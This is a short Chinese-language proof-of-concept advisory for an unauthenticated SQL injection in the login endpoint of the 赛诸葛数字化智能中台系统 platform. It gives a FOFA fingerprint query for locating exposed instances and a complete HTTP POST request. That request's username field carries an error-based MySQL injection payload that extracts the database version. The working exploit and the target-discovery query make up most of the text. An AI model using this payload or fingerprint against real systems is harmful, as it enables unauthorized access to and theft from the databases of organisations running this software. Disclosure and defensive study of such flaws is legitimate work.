# 赛诸葛数字化智能中台系统login存在SQL注入漏洞

赛诸葛数字化智能中台系统 login 登录接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息。

## fofa
```javascript
body="static/index/image/login_left.png" || icon_hash="1056416905"
```

## poc
```javascript
POST /login HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Connection: keep-alive

username=1')) AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(3469=3469,version()))),0x7e),3469) AND (('fOfY'='fOfY&loginType=1&password=bbb8aae57c104cda40c93843ad5e6db8&phone_head=86&wx_openid=&member=
```

![image-20241227221000969](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272210041.png)